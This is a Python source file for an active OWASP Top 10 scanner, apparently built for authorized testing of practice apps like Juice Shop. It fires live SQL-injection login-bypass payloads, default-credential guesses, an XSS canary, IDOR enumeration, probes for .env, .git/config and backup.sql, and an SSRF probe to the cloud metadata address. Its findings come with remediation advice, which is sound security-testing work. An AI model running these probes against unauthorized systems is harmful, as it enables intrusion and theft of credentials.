import json
import re
import time
from urllib.parse import urljoin

import requests

TIMEOUT = 8
UA = "RedTeamFramework-WebAppLogicChecker/1.0"


def _get(url, **kw):
    try:
        return requests.get(url, timeout=TIMEOUT, headers={"User-Agent": UA}, **kw)
    except requests.RequestException:
        return None


def _post(url, **kw):
    try:
        return requests.post(url, timeout=TIMEOUT, headers={"User-Agent": UA}, **kw)
    except requests.RequestException:
        return None


_FORM_RE = re.compile(r"<form\b([^>]*)>(.*?)</form>", re.IGNORECASE | re.DOTALL)
_ATTR_RE = re.compile(r'(\w+)\s*=\s*["\']([^"\']*)["\']', re.IGNORECASE)
_INPUT_RE = re.compile(r"<input\b([^>]*)>", re.IGNORECASE)


def discover_forms(base_url, html, session=None):
    forms = []
    for attrs_raw, body in _FORM_RE.findall(html):
        attrs = dict((k.lower(), v) for k, v in _ATTR_RE.findall(attrs_raw))
        action = attrs.get("action", "")
        method = attrs.get("method", "get").lower()
        abs_action = urljoin(base_url + "/", action) if action else base_url

        fields = {}
        for input_attrs_raw in _INPUT_RE.findall(body):
            input_attrs = dict((k.lower(), v) for k, v in _ATTR_RE.findall(input_attrs_raw))
            name = input_attrs.get("name")
            if not name:
                continue
            fields[name] = input_attrs.get("type", "text").lower()

        if fields:
            forms.append({"action": abs_action, "method": method, "fields": fields})
    return forms


def discover_login_like_forms(base_url):
    candidates_pages = [
        "", "login", "signin", "account/login", "WebGoat/login",
        "user/login", "auth/login",
    ]
    found = []
    seen_actions = set()
    for path in candidates_pages:
        url = urljoin(base_url + "/", path)
        resp = _get(url)
        if resp is None or resp.status_code >= 400:
            continue
        for form in discover_forms(url, resp.text):
            field_names = " ".join(form["fields"].keys()).lower()
            has_pw = any(t == "password" for t in form["fields"].values()) or "pass" in field_names
            has_user = any(k in field_names for k in ("user", "email", "login", "name"))
            if has_pw and has_user and form["action"] not in seen_actions:
                seen_actions.add(form["action"])
                found.append(form)
    return found


class _BaseChecker:
    check_name = "Base"
    owasp_id = "A00:2025"

    def __init__(self, target_url: str, timeout: int = TIMEOUT):
        self.target_url = target_url.rstrip("/")
        self.timeout = timeout
        self.findings = []

    def _finding(self, title, description, risk, cwe_id, mitre_technique,
                 remediation, evidence, confidence=0.9):
        self.findings.append({
            "title": title,
            "description": description,
            "risk": risk,
            "cwe_id": cwe_id,
            "owasp_id": self.owasp_id,
            "mitre_technique": mitre_technique,
            "remediation": remediation,
            "evidence": evidence,
            "confidence": confidence,
        })

    def result(self):
        return {
            "check_name": self.check_name,
            "category": self.owasp_id,
            "findings": self.findings,
            "status": "COMPLETED",
        }


class ActiveInjectionChecker(_BaseChecker):
    check_name = "A01:2025 - Injection (Active SQLi)"
    owasp_id = "A01:2025"

    LOGIN_ENDPOINTS = [
        "/rest/user/login",
        "/api/login", "/login", "/api/auth/login",
        "/user/login", "/api/v1/login",
    ]

    PAYLOADS = [
        {"email": "' OR 1=1--", "password": "x"},
        {"email": "admin'--", "password": "x"},
        {"email": "' OR '1'='1", "password": "' OR '1'='1"},
        {"email": "admin' #", "password": "irrelevant"},
    ]

    def run_check(self) -> dict:
        print(f"[*] Testing A01:2025 - Injection (active) on: {self.target_url}")

        for endpoint in self.LOGIN_ENDPOINTS:
            url = urljoin(self.target_url + "/", endpoint.lstrip("/"))
            baseline = _post(url, json={"email": "nobody@nowhere.test", "password": "wrong"})
            if baseline is None or baseline.status_code == 404:
                continue
            for payload in self.PAYLOADS:
                resp = _post(url, json=payload)
                if resp is None:
                    continue
                if self._looks_authenticated(resp, baseline):
                    self._report_sqli(url, payload, baseline, resp)
                    return self.result()

        for form in discover_login_like_forms(self.target_url):
            user_field = next((k for k, t in form["fields"].items()
                                if t != "password" and "pass" not in k.lower()), None)
            pass_field = next((k for k, t in form["fields"].items()
                                if t == "password" or "pass" in k.lower()), None)
            if not user_field or not pass_field:
                continue

            base_data = {f: "x" for f in form["fields"]}
            base_data[user_field] = "nobody"
            base_data[pass_field] = "wrong"
            baseline = (_post(form["action"], data=base_data, allow_redirects=False) if form["method"] == "post"
                        else _get(form["action"], params=base_data, allow_redirects=False))
            if baseline is None:
                continue

            for payload_user, payload_pass in (
                ("' OR 1=1--", "x"), ("admin'--", "x"), ("' OR '1'='1", "' OR '1'='1"),
            ):
                data = dict(base_data)
                data[user_field] = payload_user
                data[pass_field] = payload_pass
                resp = (_post(form["action"], data=data, allow_redirects=False) if form["method"] == "post"
                        else _get(form["action"], params=data, allow_redirects=False))
                if resp is None:
                    continue

                if self._looks_authenticated_form(resp, baseline):
                    self._report_sqli(form["action"], {user_field: payload_user, pass_field: payload_pass},
                                       baseline, resp)
                    return self.result()

        print("  [ActiveInjectionChecker] No exploitable login SQLi found")
        return self.result()

    def _report_sqli(self, url, payload, baseline, resp):
        self._finding(
            title="SQL Injection — Authentication Bypass",
            description=(
                f"Login form/endpoint at {url} accepted a SQL-injection "
                f"payload ({payload}) and returned an authenticated "
                f"response, while a baseline invalid login was rejected."
            ),
            risk="CRITICAL",
            cwe_id="CWE-89",
            mitre_technique="T1190",
            remediation="Use parameterized queries / an ORM; never "
                        "concatenate user input into SQL. Re-validate "
                        "with a WAF/input-validation layer.",
            evidence=[
                f"POST {url}",
                f"payload={json.dumps(payload)}",
                f"baseline_status={baseline.status_code} payload_status={resp.status_code}",
            ],
            confidence=0.85,
        )

    @staticmethod
    def _looks_authenticated_form(resp, baseline):
        if resp.status_code in (301, 302) and resp.headers.get("Location") != baseline.headers.get("Location"):
            loc = resp.headers.get("Location", "").lower()
            if "error" not in loc and "login" not in loc:
                return True
        err_markers = ("invalid", "incorrect", "denied", "error", "failed")
        resp_has_error = any(m in resp.text.lower() for m in err_markers)
        baseline_has_error = any(m in baseline.text.lower() for m in err_markers)
        return baseline_has_error and not resp_has_error and resp.status_code == 200

    @staticmethod
    def _looks_authenticated(resp, baseline):
        try:
            body = resp.json()
        except ValueError:
            body = {}
        text_blob = json.dumps(body).lower() if body else resp.text.lower()

        has_token = any(k in text_blob for k in ("token", "authentication", "jwt", "bearer"))
        set_cookie = "set-cookie" in resp.headers and resp.headers.get("set-cookie", "") != baseline.headers.get("set-cookie", "")
        status_improved = resp.status_code == 200 and baseline.status_code != 200

        return (has_token or set_cookie) and status_improved


class ActiveAuthChecker(_BaseChecker):
    check_name = "A07:2025 - Authentication Failures (Active)"
    owasp_id = "A07:2025"

    LOGIN_ENDPOINTS = ActiveInjectionChecker.LOGIN_ENDPOINTS
    CREDS = [
        ("admin@juice-sh.op", "admin123"),
        ("admin@admin.com", "admin"),
        ("admin", "admin"),
        ("admin", "password"),
        ("test@test.com", "test123"),
        ("guest", "guest"),
        ("webgoat", "webgoat"),
    ]

    def run_check(self) -> dict:
        print(f"[*] Testing A07:2025 - Auth Failures (active) on: {self.target_url}")

        for endpoint in self.LOGIN_ENDPOINTS:
            url = urljoin(self.target_url + "/", endpoint.lstrip("/"))
            baseline = _post(url, json={"email": "nobody@nowhere.test", "password": "wrong"})
            if baseline is None or baseline.status_code == 404:
                continue
            for email, pwd in self.CREDS:
                resp = _post(url, json={"email": email, "password": pwd})
                if resp is None:
                    continue
                if ActiveInjectionChecker._looks_authenticated(resp, baseline):
                    self._report_weak_creds(url, email, pwd)
                    return self.result()

        for form in discover_login_like_forms(self.target_url):
            user_field = next((k for k, t in form["fields"].items()
                                if t != "password" and "pass" not in k.lower()), None)
            pass_field = next((k for k, t in form["fields"].items()
                                if t == "password" or "pass" in k.lower()), None)
            if not user_field or not pass_field:
                continue

            base_data = {f: "x" for f in form["fields"]}
            base_data[user_field] = "nobody"
            base_data[pass_field] = "wrong"
            baseline = (_post(form["action"], data=base_data, allow_redirects=False) if form["method"] == "post"
                        else _get(form["action"], params=base_data, allow_redirects=False))
            if baseline is None:
                continue

            for email, pwd in self.CREDS:
                data = dict(base_data)
                data[user_field] = email
                data[pass_field] = pwd
                resp = (_post(form["action"], data=data, allow_redirects=False) if form["method"] == "post"
                        else _get(form["action"], params=data, allow_redirects=False))
                if resp is None:
                    continue
                if ActiveInjectionChecker._looks_authenticated_form(resp, baseline):
                    self._report_weak_creds(form["action"], email, pwd)
                    return self.result()

        print("  [ActiveAuthChecker] No default/weak credentials accepted")
        return self.result()

    def _report_weak_creds(self, url, email, pwd):
        self._finding(
            title="Default / Weak Credentials Accepted",
            description=f"Login endpoint {url} authenticated successfully "
                        f"with a well-known default credential pair.",
            risk="HIGH",
            cwe_id="CWE-521",
            mitre_technique="T1078",
            remediation="Remove default accounts before deployment; "
                        "enforce a strong password policy and MFA.",
            evidence=[f"POST {url}", f"credentials={email}:{'*' * len(pwd)}"],
            confidence=0.85,
        )


class ActiveXSSChecker(_BaseChecker):
    check_name = "A03:2025 - Cross-Site Scripting (Active)"
    owasp_id = "A03:2025"

    PARAMS = ["q", "search", "id", "redirect", "returnUrl", "query"]
    CANARY = "<script>alert('xsscanary123')</script>"

    def run_check(self) -> dict:
        print(f"[*] Testing reflected XSS (active) on: {self.target_url}")

        for param in self.PARAMS:
            url = f"{self.target_url}/?{param}={self.CANARY}"
            resp = _get(url)
            if resp is None:
                continue
            if self.CANARY in resp.text:
                self._finding(
                    title="Reflected Cross-Site Scripting",
                    description=f"Parameter '{param}' is reflected into the "
                                f"HTML response without encoding.",
                    risk="HIGH",
                    cwe_id="CWE-79",
                    mitre_technique="T1189",
                    remediation="HTML-encode all user input before rendering; "
                                "adopt a strict Content-Security-Policy.",
                    evidence=[f"GET {url}", "canary payload found unescaped in response body"],
                    confidence=0.85,
                )
        if not self.findings:
            print("  [ActiveXSSChecker] No reflected XSS found on tested parameters")
        return self.result()


class ActiveIDORChecker(_BaseChecker):
    check_name = "A02:2025 - Broken Access Control (Active IDOR)"
    owasp_id = "A02:2025"

    PATTERNS = [
        "/api/Users/{id}", "/rest/user/{id}", "/api/users/{id}",
        "/api/orders/{id}", "/api/baskets/{id}",
    ]

    def run_check(self) -> dict:
        print(f"[*] Testing A02:2025 - Broken Access Control (active IDOR) on: {self.target_url}")

        for pattern in self.PATTERNS:
            hits = 0
            for oid in (1, 2, 3):
                url = urljoin(self.target_url + "/", pattern.format(id=oid).lstrip("/"))
                resp = _get(url)
                if resp is None:
                    continue
                if resp.status_code == 200:
                    try:
                        body = resp.json()
                    except ValueError:
                        body = None
                    if body:
                        hits += 1
            if hits >= 2:
                self._finding(
                    title="Insecure Direct Object Reference (IDOR)",
                    description=(
                        f"Endpoint pattern '{pattern}' returned object data for "
                        f"{hits} sequential IDs without authentication/authorization."
                    ),
                    risk="HIGH",
                    cwe_id="CWE-639",
                    mitre_technique="T1078",
                    remediation="Enforce object-level authorization on every "
                                "request; use indirect/opaque references.",
                    evidence=[f"pattern={pattern}", f"accessible_ids_tested=3, confirmed={hits}"],
                    confidence=0.8,
                )
        if not self.findings:
            print("  [ActiveIDORChecker] No unauthenticated object access found")
        return self.result()


class SensitiveFileChecker(_BaseChecker):
    check_name = "A05/A06:2025 - Sensitive File Exposure (Active)"
    owasp_id = "A05:2025"

    TARGETS = {
        "/.env": ["DB_", "SECRET", "API_KEY", "="],
        "/.git/config": ["[core]", "repositoryformatversion"],
        "/package.json": ['"name"', '"dependencies"'],
        "/server.js": ["require(", "express"],
        "/config.json": ["{"],
        "/swagger.json": ["swagger", "openapi"],
        "/backup.sql": ["INSERT INTO", "CREATE TABLE"],
    }

    def run_check(self) -> dict:
        print(f"[*] Testing sensitive file exposure (active) on: {self.target_url}")

        for path, signatures in self.TARGETS.items():
            url = self.target_url + path
            resp = _get(url)
            if resp is None or resp.status_code != 200:
                continue
            body = resp.text[:2000]
            if any(sig in body for sig in signatures):
                self._finding(
                    title=f"Sensitive File Exposed: {path}",
                    description=f"{path} is publicly accessible and its content "
                                f"matches expected signatures for this file type.",
                    risk="HIGH" if path in (".env", "/backup.sql") else "MEDIUM",
                    cwe_id="CWE-538",
                    mitre_technique="T1552",
                    remediation=f"Remove or block public access to {path}; "
                                f"exclude it from the web root / deployment bundle.",
                    evidence=[f"GET {url} -> 200", f"matched_signature=True"],
                    confidence=0.85,
                )
        if not self.findings:
            print("  [SensitiveFileChecker] No exposed sensitive files found")
        return self.result()


class ActiveSSRFChecker(_BaseChecker):
    check_name = "A10:2025 - SSRF (Active)"
    owasp_id = "A10:2025"

    PARAM_ENDPOINTS = [
        ("/api/deluxe-membership", "redirectUrl"),
        ("/profile/image/url", "url"),
        ("/rest/saveLoginIp", "ip"),
        ("/api/proxy", "url"),
    ]
    INTERNAL_PROBE = "http://169.254.169.254/latest/meta-data/"

    def run_check(self) -> dict:
        print(f"[*] Testing A10:2025 - SSRF (active) on: {self.target_url}")

        for endpoint, param in self.PARAM_ENDPOINTS:
            url = urljoin(self.target_url + "/", endpoint.lstrip("/"))
            baseline = _post(url, json={param: "http://example.com"})
            if baseline is None or baseline.status_code == 404:
                continue

            start = time.time()
            probe = _post(url, json={param: self.INTERNAL_PROBE})
            elapsed = time.time() - start
            if probe is None:
                continue

            if probe.status_code == 200 and probe.text != baseline.text:
                self._finding(
                    title="Potential Server-Side Request Forgery",
                    description=(
                        f"Parameter '{param}' on {endpoint} accepted an internal "
                        f"metadata-service URL and returned a response distinct "
                        f"from the external-URL baseline (response_time={elapsed:.2f}s)."
                    ),
                    risk="HIGH",
                    cwe_id="CWE-918",
                    mitre_technique="T1090",
                    remediation="Whitelist allowed destination hosts server-side; "
                                "block requests to link-local/metadata ranges.",
                    evidence=[f"POST {url}", f"param={param}", f"probe={self.INTERNAL_PROBE}"],
                    confidence=0.6,
                )
        if not self.findings:
            print("  [ActiveSSRFChecker] No SSRF-capable parameters confirmed")
        return self.result()


ALL_CHECKERS = [
    ActiveInjectionChecker,
    ActiveAuthChecker,
    ActiveXSSChecker,
    ActiveIDORChecker,
    SensitiveFileChecker,
    ActiveSSRFChecker,
]


def run_all_active_checks(target_url: str) -> dict:
    all_findings = []
    per_check = {}

    for checker_cls in ALL_CHECKERS:
        checker = checker_cls(target_url)
        result = checker.run_check()
        per_check[result["check_name"]] = result
        all_findings.extend(result["findings"])

    summary = {
        "target": target_url,
        "total_findings": len(all_findings),
        "critical": sum(1 for f in all_findings if f["risk"] == "CRITICAL"),
        "high": sum(1 for f in all_findings if f["risk"] == "HIGH"),
        "medium": sum(1 for f in all_findings if f["risk"] == "MEDIUM"),
    }

    return {"summary": summary, "checks": per_check, "findings": all_findings}


if __name__ == "__main__":
    import sys

    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:3000"
    print(f"\n{'=' * 60}\nActive OWASP Top 10 Logic Testing -> {target}\n{'=' * 60}\n")

    report = run_all_active_checks(target)

    print(f"\n{'=' * 60}")
    print(f"SUMMARY: {report['summary']['total_findings']} confirmed finding(s) "
          f"(CRITICAL={report['summary']['critical']} "
          f"HIGH={report['summary']['high']} "
          f"MEDIUM={report['summary']['medium']})")
    print(f"{'=' * 60}\n")

    for f in report["findings"]:
        print(f"[{f['risk']}] {f['title']}  ({f['owasp_id']} / {f['cwe_id']})")
        for e in f["evidence"]:
            print(f"    - {e}")
        print()
